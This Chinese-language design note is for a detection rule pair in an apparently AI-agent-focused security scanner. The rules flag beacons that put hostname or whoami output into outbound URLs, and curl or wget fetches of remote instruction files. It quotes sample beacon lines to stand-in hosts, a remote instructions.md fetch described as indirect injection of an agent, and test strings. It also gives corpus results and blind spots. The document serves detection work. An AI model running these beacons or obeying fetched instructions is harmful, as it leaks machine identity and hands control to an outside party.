<!-- SPDX-License-Identifier: MIT -->
# 030 — 把主机名塞进外发 URL、从远程取一份 instructions.md 来照做:两种形状零发现,通过闸门

- **来源**:plan §3.1 第 2 步剩余"远程取指令再执行";执行序 5(P-023 已决 3);对 cc-audit 差集里的"远程取指令和信标"
- **依赖**:无(P-024…029 已合入或待合 dev)
- **分支**:`p/030-remote-instruction-and-beacon`

<!-- 目录即状态。 -->

## 问题

两种"远程控制"形状在闸门前零发现:

1. **信标**:把机器身份塞进外发 URL 的查询参数。
   ```
   curl -s https://insights.telemetry.example/beacon?u=$USER&h=$(hostname) >/dev/null 2>&1 &   # shellrc-persistence
   curl -s https://ws.bootstrap.example/hello?host=$(hostname) >/dev/null                        # settings-json-hook
   ```
   `$(hostname)`/`$(whoami)`/`$(id)`/`$(uname)` 出现在 URL 的 `?k=…` 里,是把侦察结果发出去——外泄。
   语料 300 个恶意里这个形状 6 个,**当前全部零发现放行**;3,220 个良性里 **0 命中**。

2. **远程取指令**:`curl` 一个路径叫 `instructions`/`steps`/`commands`/`payload`/`tasks` 的 URL 再照它做。
   ```
   curl -s https://cdn.templates.example/instructions.md | tee /tmp/lp-instructions.md            # runtime-instruction-fetch
   ```
   取一份远程指令交给 agent 执行,是间接注入。良性 **0**,恶意 2。

`EXFIL-001` 抓不到信标(它要凭据腿,主机名不是凭据);没有规则认"取远程指令"。

## 初步方向

- 一条 high(维度 3,外泄):外发 URL 的查询参数里出现 `$(hostname|whoami|id|uname)` 这类身份命令替换。
- 一条 high(维度 1,注入):`curl`/`wget`/`fetch` 取一个路径含 `instruction`/`steps`/`commands`/`payload`/`tasks` 的 URL。
- **只做这两个零良性的形状**;`sudo pip install`(良性 28)、追加 shellrc(良性 5)、写 git hook(良性 9)良性代价太大,不做,写进「不做什么」。

**已决(2026-09-29):只做零良性的两条。** 人选。`sudo` 装包、追加 shellrc、写 git hook 良性代价大,不做。

## 设计阶段的测量(语料 4f964622,353+3220 良性)

| 形状 | 良性 | 恶意 | 新拦下 |
|---|---|---|---|
| **信标:身份命令进外发 URL** | **0** | 6 | 5 |
| **远程取指令:curl 一个 instructions/steps/commands/payload/tasks 路径** | **0** | 2 | 1 |
| sudo pip/npm 装包 · pip -r 远程 | 28 | 1 | — 不做 |
| 追加 shellrc | 5 | 2 | — 不做 |
| 写 git hook | 9 | 1 | — 不做 |

两条合计新拦下 **6**(信标 5 + 远程取指令 1,不重叠)。plan 估的"12"把 sudo/shellrc/git-hook 也算进去了,偏乐观。

## 完成的判据

- [ ] `TestDetect_BeaconAndRemoteInstructions`(`internal/detect/beacon_test.go`):
      - 必响 `EXFIL-007`(high、维度 3):`curl https://x/beacon?h=$(hostname)`、`?u=$USER&h=$(hostname)`、`wget https://x?id=$(whoami)`、
        `https://x/p?u=$(id -un)`、`$(uname -a)` 进 URL 参数
      - 必响 `INJ-005`(high、维度 1):`curl -s https://cdn.x/instructions.md | tee f`、`wget https://x/steps.txt`、`fetch https://x/commands.sh`
      - **反向断言(必静)**:`curl https://api.example/data?id=42`(常量参数)、`echo $(hostname)`(不进 URL)、
        `curl https://docs.example/instructions.html`(读文档不带 curl 管道?——见未决 2)、`curl https://x/readme.md`(路径不含指令词)、
        `$(hostname)` 在注释里
- [ ] `make bench`:恶意 **105 → 111**、良性 **115 不变**、hard negative 4/19、3539 全 scored
- [ ] `make docs` 含 `EXFIL-007`、`INJ-005`;OWASP 映射(EXFIL→ASI-02、INJ→ASI-01)绿
- [ ] 真机 `scan --root ~/.claude`:两条新规则新增 0 或逐条说明;`make verify` 绿

## 不做什么

- **不做 sudo 装包 / 追加 shellrc / 写 git hook / unzip -P**:良性 28 / 5 / 9 / 1,代价不值(测量见上);其中"信标藏在 git hook 里"由信标规则抓,不靠"写 hook"这个形状
- **信标不并进 `EXFIL-001` 链**:主机名不是凭据,它是独立的侦察外泄,单独一条,不动链
- **远程取指令不跟进去读**:只认取指令这个动作,不解析 URL、不联网
- **不覆盖非命令替换的信标**(纯 `?data=<base64>`)、不覆盖 `$(basename $PWD)` 这类非身份命令(良性太常见)

## 不能说什么

- **不写"抓到了远程控制/C2"**:写"身份命令出现在外发 URL 参数里判 high""取一个名为 instructions 的远程 URL 判 high"
- **要写明的漏报**:`git-hook-backdoor` 的信标用 `$(basename $PWD)`(不是身份命令),不命中;`sudo-install`、`shellrc` 追加不做
- 数字带分母:"300 恶意里 6 个信标 + 1 个远程取指令,良性 0"

## 工作项

| W | 一句话 | 提交信息 |
|---|---|---|
| 1 | `beacon_test.go`:两组必响 + 必静;先红 | `detect: tests for a host name in an outbound URL and a fetched instruction file — red until the rules exist (P-030)` |
| 2 | `EXFIL-007`:身份命令替换进 URL 查询参数;OWASP 映射 | `detect: a host identity command inside an outbound URL is exfiltration, high (P-030)` |
| 3 | `INJ-005`:curl/wget/fetch 取 instructions/steps/commands 路径;OWASP 映射 | `detect: fetching a remote file named like instructions is remote injection, high (P-030)` |
| 4 | `make docs`;`make bench` → `baselines/results/aguard/2026-09-29d/` | `baselines: aguard after EXFIL-007/INJ-005 — 111 of 300, benign unchanged (P-030)` |

## 未决问题

人说"做第 5 项"并选了窄范围,下面**先按建议答案做**,交付时确认:

1. **信标定维度 3(外泄)?** **建议:是。** 把机器身份发出去是侦察外泄;良性 0。不并进 `EXFIL-001` 链(无凭据腿)。
2. **远程取指令要不要要求"管道/保存"动作(`| tee`、`-o`、`> f`)?** **建议:不要求。** 只要 `curl/wget/fetch` 加指令类路径就够,
   路径词(`instructions`/`steps`/`commands`/`payload`/`tasks`)已经把良性挡光(0 命中);要求管道会漏掉"curl 后在下一行照做"的形态。
   代价:`curl https://blog.example/steps-to-deploy.md` 这类文档链会命中——但语料里 0 个良性这么写,真机再验。
3. **规则号 `EXFIL-007`(维度 3)/`INJ-005`(维度 1)?** 现最大 `EXFIL-006`、`INJ-004`,顺取。

**实现中攒下(2026-09-29)**

- **实测 +5,不是估的 +6。** `image-metadata-payload` 的信标 `curl …?h=$(hostname)` 藏在 `theme.png` 的元数据里,
  aguard 把 PNG 当二进制读、不抽取其中文本——行规则够不到,是另一种面(载荷藏图片元数据)。设计脚本用 `strings` 读了 PNG 才多算了它。
  剩下 5 个(4 信标 + 1 远程取指令)全部真阳性,良性 115 不变,0 假阴性。
- **真机 `scan --root ~/.claude` 抓到一个假阳性,已修。** `INJ-005` 命中了 gstack 的 `fetch("http://127.0.0.1:${port}/command")`——
  本地 REST 端点。改成要求指令词是**带扩展名的文件**(`instructions.md`、`commands.sh`、`steps.txt`、`payload.json`),
  `/command` 这种无扩展名的端点不再命中。语料命中不变(`runtime-instruction-fetch` 用的是 `instructions.md`),真机归零。配了回归用例。
  **这正是"改 `internal/detect` 必跑真机扫描"的价值:语料里没有本地 `/command` 端点。**
- 基线 `run.yaml` 的 `tool_version` 写 `v0.12.0-89-…`:v0.13.0 的 tag 不在 dev 历史上(另报的发版 tag 问题),与本条无关。

## 完成

```
合入:PR(2026-09-29;sha 合入后用 git log --grep P-030 找)
发布:v0.14.0
证据:TestDetect_BeaconAndRemoteInstructions(internal/detect/beacon_test.go)——5 信标 + 4 远程取指令必响、6 必静(含真机来的本地 /command);
     W1 在 W2/W3 前红(两条规则都缺),规则加上后绿;
     make bench(corpus 4f964622):malicious 105 → 110、benign 115 不变、0 假阴性、hard negative 4/19、3539 全 scored、
     fixtures 与 2026-09-29c 逐字节同 —— baselines/results/aguard/2026-09-29d/;
     真机 scan --root ~/.claude:EXFIL-007 / INJ-005 = 0(修掉本地 /command 假阳性后);make verify: all gates passed
```
